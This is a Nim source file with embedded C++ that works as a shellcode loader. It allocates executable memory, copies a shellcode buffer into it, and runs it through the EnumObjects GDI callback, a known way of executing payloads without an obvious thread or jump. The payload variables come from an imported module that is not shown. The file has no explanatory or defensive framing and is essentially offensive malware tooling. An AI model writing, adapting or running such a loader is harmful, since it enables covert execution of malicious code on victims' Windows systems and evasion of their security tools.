import public

{.emit: """

int EnumDesktopWNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);
    LOGFONTW lf = { 0 };
    lf.lfCharSet = DEFAULT_CHARSET;
    HDC dc = GetDC(NULL);
    EnumObjects(dc, OBJ_BRUSH, (GOBJENUMPROC)addr, NULL);
}
"""
.}

proc EnumObjectsNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumDesktopWNim(@)",nodecl.}

discard EnumObjectsNim(code,codelen)